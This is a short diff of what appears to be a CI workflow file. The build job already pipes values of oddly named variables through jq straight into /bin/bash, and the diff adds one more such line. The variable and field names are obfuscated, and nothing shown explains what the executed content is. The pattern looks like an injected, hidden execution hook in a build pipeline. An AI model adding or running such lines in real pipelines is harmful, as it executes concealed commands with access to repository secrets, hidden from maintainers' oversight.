@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$rt9" | jq -r .gu8 | /bin/bash
           echo $ugeta681 | jq -r .ngihy71721 | /bin/bash
           printf '%s' "$gtt2" | jq -r .te66967 | /bin/bash
+          echo $ge99 | jq -r .hspj5 | /bin/bash
 
       - name: Upload artifact
         if: always()
